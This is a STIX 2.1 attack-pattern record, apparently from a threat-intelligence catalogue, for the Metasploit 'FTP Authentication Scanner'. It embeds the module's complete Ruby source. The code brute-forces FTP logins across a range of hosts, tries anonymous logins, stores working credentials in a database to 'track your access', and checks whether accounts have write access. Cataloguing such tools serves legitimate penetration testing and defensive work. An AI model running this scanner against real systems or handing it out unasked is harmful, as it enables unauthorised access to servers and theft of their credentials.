{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--983c200d-07b6-4ba6-889b-55fa1d13012e",
    "created": "2024-08-14T16:28:08.50339Z",
    "modified": "2024-08-14T16:28:08.503394Z",
    "name": "FTP Authentication Scanner",
    "description": " This module will test FTP logins on a range of machines and report successful logins.  If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ftp/ftp_login.rb",
            "external_id": "ftp_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/ftp'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Ftp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def proto\n    'ftp'\n  end\n\n  def initialize\n    super(\n      'Name'        => 'FTP Authentication Scanner',\n      'Description' => %q{\n        This module will test FTP logins on a range of machines and\n        report successful logins.  If you have loaded a database plugin\n        and connected to a database this module will record successful\n        logins and hosts so you can track your access.\n      },\n      'Author'      => 'todb',\n      'References'     =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'     => MSF_LICENSE,\n      'DefaultOptions' => {\n        'ConnectTimeout' => 30\n      }\n    )\n\n    register_options(\n      [\n        Opt::Proxies,\n        Opt::RPORT(21),\n        OptBool.new('RECORD_GUEST', [ false, \"Record anonymous/guest logins to the database\", false])\n      ])\n\n    register_advanced_options(\n      [\n        OptBool.new('SINGLE_SESSION', [ false, 'Disconnect after every login attempt', false]),\n      ]\n    )\n\n    deregister_options('FTPUSER','FTPPASS', 'PASSWORD_SPRAY') # Can use these, but should use 'username' and 'password'\n    @accepts_all_logins = {}\n  end\n\n\n  def run_host(ip)\n    print_status(\"#{ip}:#{rport} - Starting FTP login sweep\")\n\n    cred_collection = build_credential_collection(\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD'],\n        prepended_creds: anonymous_creds\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::FTP.new(\n        host: ip,\n        port: rport,\n        proxies: datastore['PROXIES'],\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        max_send_size: datastore['TCP::max_send_size'],\n        send_delay: datastore['TCP::send_delay'],\n        connection_timeout: datastore['ConnectTimeout'],\n        ftp_timeout: datastore['FTPTimeout'],\n        framework: framework,\n        framework_module: self,\n        ssl: datastore['SSL'],\n        ssl_version: datastore['SSLVersion'],\n        ssl_verify_mode: datastore['SSLVerifyMode'],\n        ssl_cipher: datastore['SSLCipher'],\n        local_port: datastore['CPORT'],\n        local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_data[:private_type] = :password\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n      end\n    end\n\n  end\n\n\n  # Always check for anonymous access by pretending to be a browser.\n  def anonymous_creds\n    anon_creds = [ ]\n    if datastore['RECORD_GUEST']\n      ['IEUser@', 'User@', 'mozilla@example.com', 'chrome@example.com' ].each do |password|\n        anon_creds << Metasploit::Framework::Credential.new(public: 'anonymous', private: password)\n      end\n    end\n    anon_creds\n  end\n\n  def test_ftp_access(user,scanner)\n    dir = Rex::Text.rand_text_alpha(8)\n    write_check = scanner.send_cmd(['MKD', dir], true)\n    if write_check and write_check =~ /^2/\n      scanner.send_cmd(['RMD',dir], true)\n      print_status(\"#{rhost}:#{rport} - User '#{user}' has READ/WRITE access\")\n      return 'Read/Write'\n    else\n      print_status(\"#{rhost}:#{rport} - User '#{user}' has READ access\")\n      return 'Read-only'\n    end\n  end\n\n\nend\n"
}